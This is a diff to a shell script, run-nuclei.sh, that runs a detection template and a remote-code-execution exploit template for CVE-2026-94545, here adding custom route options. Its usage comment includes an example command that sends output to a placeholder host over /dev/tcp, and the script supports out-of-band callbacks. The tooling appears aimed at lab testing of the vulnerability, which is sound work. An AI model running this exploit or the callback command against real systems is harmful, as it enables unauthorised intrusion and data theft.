@@ -15,6 +15,8 @@
 #   ./run-nuclei.sh http://127.0.0.1:3000 --oast 127.0.0.1:4444
 #   ./run-nuclei.sh http://127.0.0.1:3000 --cmd 'bash -c "id>/dev/tcp/HOST/PORT"'
 #   ./run-nuclei.sh ... --no-keygen                 # do not create a keypair
+#   ./run-nuclei.sh http://127.0.0.1:3000 --ogpath /og          # sink at a custom route
+#   ./run-nuclei.sh http://127.0.0.1:3000 --paths /api/og,/og   # candidate route list
 #   ./run-nuclei.sh ... --keys-dir /path/to/keys    # use a specific keypair
 set -uo pipefail
 
@@ -27,6 +29,8 @@ RUN_RCE=1
 KEYGEN=1
 CMD=""
 OAST=""
+OGPATH=""
+PATHS=""
 
 while [ $# -gt 0 ]; do
   case "$1" in
@@ -35,6 +39,8 @@ while [ $# -gt 0 ]; do
     --keys-dir)   KEYS_DIR="${2:?--keys-dir needs a path}"; shift 2 ;;
     --cmd)    CMD="${2:-}"; shift 2 ;;
     --oast)   OAST="${2:-}"; shift 2 ;;
+    --ogpath) OGPATH="${2:-}"; shift 2 ;;
+    --paths)  PATHS="${2:-}"; shift 2 ;;
     -h|--help) sed -n '2,60p' "${BASH_SOURCE[0]}" | sed '/^[^#]/,$d' | sed 's/^# \{0,1\}//'; exit 0 ;;
     *) TARGET="$1"; shift ;;
   esac
@@ -106,7 +112,10 @@ run_template() { # template-file, extra nuclei args...
 
 # ------------------------------------------------------------------- detection
 log "detection template against $TARGET"
-run_template "$SIGNED_DIR/CVE-2026-94545.yaml"
+path_args=()
+[ -n "$OGPATH" ] && path_args+=(-var "ogpath=$OGPATH")
+[ -n "$PATHS" ]  && path_args+=(-var "paths=$PATHS")
+run_template "$SIGNED_DIR/CVE-2026-94545.yaml" "${path_args[@]}"
 detection_events="$(grep -c '"template-id"' "$RESULT_FILE" 2>/dev/null || true)"
 rm -f "$RESULT_FILE"
 
@@ -133,6 +142,8 @@ log "exploit template against $TARGET"
 rce_args=()
 [ -n "$CMD" ]  && rce_args+=(-var "cmd=$CMD")
 [ -n "$OAST" ] && rce_args+=(-var "oast=$OAST")
+[ -n "$OGPATH" ] && rce_args+=(-var "ogpath=$OGPATH")
+[ -n "$PATHS" ]  && rce_args+=(-var "paths=$PATHS")
 if [ -z "$CMD" ] && [ -z "$OAST" ]; then
   log "callback channel: interactsh (the target needs outbound internet)"
 fi
